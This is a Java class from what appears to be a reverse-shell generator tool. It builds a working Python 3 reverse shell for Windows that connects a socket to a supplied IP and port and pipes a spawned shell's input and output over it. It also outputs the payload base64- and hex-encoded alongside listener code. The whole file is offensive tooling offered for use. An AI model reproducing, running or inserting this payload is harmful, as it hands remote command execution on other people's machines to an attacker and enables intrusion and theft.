    package com.iteso.ReverseShellGenerator.Reverse.Shells;
    import com.iteso.ReverseShellGenerator.DEncoder;
    import com.iteso.ReverseShellGenerator.Reverse.Reverse;

    public class Python3_Windows extends Reverse {

        protected String shellFormat = "";

        public Python3_Windows(String localIP, int localPort, LISTENER listener, SHELLS shellType){
            super(localIP, localPort, listener, shellType);
            shellFormat = String.format("import os,socket,subprocess,threading;\r\n" + //
                    "def s2p(s, p):\r\n" + //
                    "    while True:\r\n" + //
                    "        data = s.recv(1024)\r\n" + //
                    "        if len(data) > 0:\r\n" + //
                    "            p.stdin.write(data)\r\n" + //
                    "            p.stdin.flush()\r\n" + //
                    "\r\n" + //
                    "def p2s(s, p):\r\n" + //
                    "    while True:\r\n" + //
                    "        s.send(p.stdout.read(1))\r\n" + //
                    "\r\n" + //
                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\r\n" + //
                    "s.connect((\"%s\",%s))\r\n" + //
                    "\r\n" + //
                    "p=subprocess.Popen([\"%s\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\r\n" + //
                    "\r\n" + //
                    "s2p_thread = threading.Thread(target=s2p, args=[s, p])\r\n" + //
                    "s2p_thread.daemon = True\r\n" + //
                    "s2p_thread.start()\r\n" + //
                    "\r\n" + //
                    "p2s_thread = threading.Thread(target=p2s, args=[s, p])\r\n" + //
                    "p2s_thread.daemon = True\r\n" + //
                    "p2s_thread.start()\r\n" + //
                    "\r\n" + //
                    "try:\r\n" + //
                    "    p.wait()\r\n" + //
                    "except KeyboardInterrupt:\r\n" + //
                    "    s.close()",this.getLocalIP() ,this.getLocalPort(), this.getShell() );
        }

        @Override
        public String getShellCode(){
            return shellFormat;
        }

        @Override
        public String toString(){
            return "{" + "\"parameters\": " + super.toString() + "," +
                        "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                        "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                        "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                        "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                    "}";
        }
    
}